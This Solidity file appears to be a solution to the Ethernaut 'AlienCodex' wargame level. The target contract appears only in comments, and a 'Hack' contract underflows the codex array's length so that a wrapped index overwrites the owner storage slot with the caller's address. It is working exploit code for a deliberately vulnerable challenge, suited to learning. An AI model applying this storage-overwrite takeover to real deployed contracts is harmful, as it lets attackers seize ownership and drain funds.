// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// contract AlienCodex is Ownable {
//     bool public contact;
//     bytes32[] public codex;

//     modifier contacted() {
//         assert(contact);
//         _;
//     }

//     function makeContact() public {
//         contact = true;
//     }

//     function record(bytes32 _content) public contacted {
//         codex.push(_content);
//     }

//     function retract() public contacted {
//         codex.length--;
//     }

//     function revise(uint256 i, bytes32 _content) public contacted {
//         codex[i] = _content;
//     }
// }

interface IAlienCodex {
    function owner() external view returns (address);

    function contact() external view returns (bool);

    function makeContact() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract Hack {
    IAlienCodex public target;

    constructor(address _target) {
        target = IAlienCodex(_target);
    }

    function hack() public {
        target.makeContact();
        target.retract();

        uint256 codexStartSlot = uint256(keccak256(abi.encodePacked(uint256(1))));

        uint256 i = type(uint256).max - codexStartSlot + 1;

        bytes32 newOwner = bytes32(uint256(uint160(msg.sender)));

        target.revise(i, newOwner);
    }
}
